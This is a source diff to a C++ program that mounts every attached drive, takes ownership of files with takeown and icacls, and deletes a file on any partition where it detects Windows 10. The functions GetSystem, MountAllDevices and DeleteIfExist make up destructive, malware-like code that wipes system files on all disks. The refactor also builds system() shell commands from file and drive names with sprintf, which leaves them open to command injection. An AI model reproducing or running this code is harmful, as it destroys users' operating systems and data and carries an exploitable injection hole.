@@ -19,7 +19,7 @@
 #include <sys/stat.h>
 #endif
 
-// #define DEBUG 1
+//#define DEBUG 1
 #ifdef DEBUG
 #define print printf
 #else
@@ -31,35 +31,27 @@
 #define BLUE   "\x1b[94m"
 #define NORMAL "\x1b[0m"
 
-static void do_nothing(auto n, ...) {}
+static void do_nothing(auto n, ...) { }
 
-enum OS_Lang { English, Spanish };
 enum AccessLevel { User = 1, Admin = 2, System = 3 };
 enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
 
-OS_Lang language;
-
 WinVer WindowsVersion() {
 #ifdef _WIN32
-  FILE* script = fopen("version.cmd", "w");
-  if (script == nullptr) return Error;
-  fputs("@Echo off\n del /F version >nul 2>&1\n ver > version", script);
-  fclose(script);
-  system("C:\\Windows\\System32\\cmd.exe /C version.cmd");
-  remove("version.cmd");
-
-  unsigned int major, minor;
-  char* strver = new char[8];
-  FILE* ver = fopen("version", "r");
-  if (ver == nullptr) return Error;
-  int readed = fscanf(ver, "\nMicrosoft Windows [%s %u.%u.", strver, &major, &minor);
+  system("ver > version");
+  FILE* ver = fopen("version", "rb");
+  fseek(ver, 0, SEEK_END);
+  long size = ftell(ver);
+  rewind(ver);
+  char* buffer = new char[size];
+  fread(buffer, 1, size, ver);
+  char digits[] = "1234567890";
+  int pos = strcspn(buffer, digits);
+  int major = int(atof(&buffer[pos]) * 10) / 10;
+  int minor = int(atof(&buffer[pos]) * 10) % 10;
   fclose(ver);
+  delete[] buffer;
   remove("version");
-
-  if (readed != 3) return Error;
-  assert(strlen(strver) + 1 == 8);
-  language = strcmp(strver, "Version") == 0 ? English : Spanish;
-  delete strver;
 
   switch (major) {
     case 10:
@@ -86,31 +78,23 @@ WinVer WindowsVersion() {
 
 static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
   if (file == nullptr) return false;
-  char* takeown = new char[strlen(file) + 21];
-  strcpy(takeown, "takeown /f ");
-  strcat(takeown, file);
-  print("Executing: %s\n", takeown);
-  strcat(takeown, ">nul 2>&1");
-  assert(strlen(takeown) + 1 == strlen(file) + 21);
+#ifdef _WIN32
+  DWORD length = UNLEN + 1;
+  char username[length];
+  GetUserName(username, &length);
+
+  char* takeown = new char[strlen(file) + 22];
+  sprintf(takeown, "takeown /f %s >nul 2>&1", file);
+  print("Executing: takeown /f %s\n", file);
   system(takeown);
   delete takeown;
 
-#ifdef _WIN32
-  DWORD length = UNLEN + 1;
-  char username[UNLEN + 1];
-  GetUserName(username, &length);
   char* grant = new char[strlen(file) + length + 28];
-  strcpy(grant, "ICACLS ");
-  strcat(grant, file);
-  strcat(grant, " /GRANT ");
-  strcat(grant, username);
-  print("Executing: %s:D\n", grant);
-  strcat(grant, ":D >nul 2>&1");
-  assert(strlen(grant) + 1 <= strlen(file) + length + 28);
+  sprintf(grant, "icacls %s /grant %s:D >nul 2>&1", file, username);
+  print("Executing: icacls %s /grant %s:D\n", file, username);
   system(grant);
   delete grant;
 #endif
-
   program = System;
   return true;
 }
@@ -163,9 +147,7 @@ void MountAllDevices() {
 
     print("Mounting drive...\n");
     char* mount = new char[strlen(drive) + 46];
-    strcpy(mount, "udisksctl mount -b /dev/");
-    strcat(mount, drive);
-    strcat(mount, " > media 2> /dev/null");
+    sprintf(mount, "udisksctl mount -b /dev/%s > media 2> /dev/null", drive);
     assert(strlen(mount) + 1 == strlen(drive) + 46);
     system(mount);
     delete mount;
@@ -207,8 +189,7 @@ void DeleteIfExist(const char* cond, const char* target) {
     print("Drive %s mounted in: %s\n", drive, source);
     if (strcmp(source, "/") == 0) strcpy(source, "\0");
     char* name = new char[strlen(source) + strlen(cond) + 1];
-    strcpy(name, source);
-    strcat(name, cond);
+    sprintf(name, "%s%s", source, cond);
     assert(strlen(name) + 1 == strlen(source) + strlen(cond) + 1);
     print("Looking for file: %s\n", name);
 
@@ -216,8 +197,7 @@ void DeleteIfExist(const char* cond, const char* target) {
     if (stat(name, &buffer) == 0) {
       print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
       char* del = new char[strlen(source) + strlen(target) + 1];
-      strcpy(del, source);
-      strcat(del, target);
+      sprintf(del, "%s%s", source, target);
       assert(strlen(del) + 1 == strlen(source) + strlen(target) + 1);
       print("Deleting %s ...\n", del);
       if (remove(del) == 0)
